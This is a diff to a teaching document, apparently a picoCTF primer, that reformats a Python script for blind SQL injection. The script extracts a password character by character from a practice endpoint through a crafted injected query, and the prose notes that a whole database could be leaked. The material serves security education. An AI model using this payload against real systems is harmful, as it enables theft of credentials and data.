@@ -236,20 +236,26 @@ image::images/3image5.png[image,width=624,height=185]
 You could possibly find the whole password manually, but it would take too much effort. On the other hand, you may want to obtain all the passwords in the database, or even all the fields from the database! This same process can be applied for any field… In most of the SQL engines there is a system table that contains the names of all tables and columns, so once we find a SQL injections databases we might be able to leak the whole database. For this exercise we will only obtain one password. To be more efficient, we will write a python script that does the job for us. Suppose we found the name of the table in some way. The script is the following:
 
 [source, python]
+----
 import requests
 from string import printable
+
 accum = ""
 for i in range(40):
   for letter in printable:
     accum += letter
+
     r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
-    + letter+"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
+    + letter +"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
+
     if 'NOTHING FOUND...' in r.text:
       accum = accum[:-1]
       print("nope")
     else:
       print(f"We found the character: {letter}")
+
 print(accum)
+----
 
 
 This script is just one of the many ways in which a blind SQL injection is done. With your knowledge of Python and SQL, you should be able to understand the script if you read it carefully. Note the following:
